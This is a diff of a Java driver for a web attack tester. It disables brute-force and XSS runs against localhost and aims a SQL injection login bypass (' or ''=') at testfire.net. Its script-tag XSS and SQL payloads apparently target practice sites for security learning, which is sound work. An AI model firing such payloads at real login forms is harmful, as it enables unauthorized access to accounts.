@@ -10,6 +10,10 @@ import java.util.List;
 
 public class UrlAttackerMain {
     public static void main(String[] args) {
+    	
+//    	Attacks.SQLAttack sql = new Attacks.SQLAttack("", null, null);
+//    	Attacks.SQLAttack sql2 = sql.recreate(null);
+    	
         List<NameValuePair> params = new ArrayList<NameValuePair>(2);
         params.add(new BasicNameValuePair("param-1", "12345"));
         params.add(new BasicNameValuePair("field", "fuzzed"));
@@ -34,14 +38,15 @@ public class UrlAttackerMain {
 
         paramsBatch.add(credentials);
 
-        Attacks.BruteforceAttack bfAttack = new Attacks.BruteforceAttack("http://localhost/webpage.php",paramsBatch, "Internal Server Error");
-        List<List<NameValuePair>> attackRes = UrlAttacker.performAttack(bfAttack);
-        if(attackRes != null)
-            System.out.println(attackRes.toString());
-        else
-            System.out.println("Something went wrong :(");
-        
-        attackRes.clear();
+//        Attacks.BruteforceAttack bfAttack = new Attacks.BruteforceAttack("http://localhost/webpage.php",paramsBatch, "Internal Server Error");
+        List<List<NameValuePair>> attackRes;
+//        List<List<NameValuePair>> attackRes = UrlAttacker.performAttack(bfAttack);
+//        if(attackRes != null)
+//            System.out.println(attackRes.toString());
+//        else
+//            System.out.println("Something went wrong :(");
+//        
+//        attackRes.clear();
         /////////////////////// XSS Attack ///////////////////////
         //param4 is protected
         List<NameValuePair> params4 = new ArrayList<NameValuePair>(2);
@@ -53,7 +58,7 @@ public class UrlAttackerMain {
         params5.add(new BasicNameValuePair("SubmitButton2", ""));
         //DB is not prompted for XSS checking form anyway.
         List<NameValuePair> params6 = new ArrayList<NameValuePair>(3);
-        params6.add(new BasicNameValuePair("username", "<script> alert(123) </script>"));
+        params6.add(new BasicNameValuePair("query", "<script> alert(123) </script>"));
         params6.add(new BasicNameValuePair("password", "<script> alert(123) </script>"));
         params6.add(new BasicNameValuePair("SubmitButton3", "")); 
 
@@ -62,26 +67,49 @@ public class UrlAttackerMain {
         paramsBatchXSS.add(params5);
         paramsBatchXSS.add(params6);
         
-        Attacks.XSSAttack xssAttack = new Attacks.XSSAttack("http://localhost/webpage.php",paramsBatchXSS);
-        attackRes = UrlAttacker.performAttack(xssAttack);
+//        Attacks.XSSAttack xssAttack = new Attacks.XSSAttack("http://localhost/webpage.php",paramsBatchXSS);
+//        Attacks.XSSAttack xssAttack = new Attacks.XSSAttack("https://xss-game.appspot.com/level1",paramsBatchXSS);
+//        attackRes = UrlAttacker.performAttack(xssAttack);
         
-         if(attackRes != null)
-            System.out.println(attackRes.toString());
-        else
-            System.out.println("Something went wrong :(");
+//         if(attackRes != null)
+//            System.out.println(attackRes.toString());
+//        else
+//            System.out.println("Something went wrong :(");
+//         
+//         attackRes.clear();
          
-         attackRes.clear();
         /////////////////////// SQL injection Attack /////////////////////// 
         List<NameValuePair> paramsSQL = new ArrayList<NameValuePair>(3);
-        paramsSQL.add(new BasicNameValuePair("username", "' or ''='"));
-        paramsSQL.add(new BasicNameValuePair("password", "' or ''='"));
-        paramsSQL.add(new BasicNameValuePair("SubmitButton3", "")); 
+        paramsSQL.add(new BasicNameValuePair("uid", "' or ''='"));
+        paramsSQL.add(new BasicNameValuePair("passw", "' or ''='"));
+//        paramsSQL.add(new BasicNameValuePair("SubmitButton3", "")); 
         
         List<List<NameValuePair>> paramsBatchSQL = new ArrayList<>();
         paramsBatchSQL.add(paramsSQL);
-
         
-        Attacks.SQLAttack sqlAttack = new Attacks.SQLAttack("http://localhost/webpage.php",paramsBatchSQL);
+        paramsSQL = new ArrayList<NameValuePair>(3);
+        paramsSQL.add(new BasicNameValuePair("uid", "' or ''='"));
+        paramsSQL.add(new BasicNameValuePair("passw", "' or ''='"));
+//        paramsSQL.add(new BasicNameValuePair("SubmitButton3", "")); 
+        paramsBatchSQL.add(paramsSQL);
+        
+        paramsSQL = new ArrayList<NameValuePair>(3);
+        paramsSQL.add(new BasicNameValuePair("uid", "hello"));
+        paramsSQL.add(new BasicNameValuePair("passw", "world"));
+//        paramsSQL.add(new BasicNameValuePair("SubmitButton3", "")); 
+        paramsBatchSQL.add(paramsSQL);
+        
+//        List<NameValuePair> base_case = new ArrayList<NameValuePair>(3);
+//        base_case.add(new BasicNameValuePair("username", ""));
+//        base_case.add(new BasicNameValuePair("password", ""));
+//        base_case.add(new BasicNameValuePair("SubmitButton3", ""));
+        
+        List<NameValuePair> base_case = new ArrayList<NameValuePair>(3);
+        base_case.add(new BasicNameValuePair("uid", "asd"));
+        base_case.add(new BasicNameValuePair("passw", "asd"));
+//        base_case.add(new BasicNameValuePair("SubmitButton3", ""));
+        
+        Attacks.SQLAttack sqlAttack = new Attacks.SQLAttack("http://testfire.net/bank/login.aspx",paramsBatchSQL, base_case);
         attackRes = UrlAttacker.performAttack(sqlAttack);
         
          if(attackRes != null)
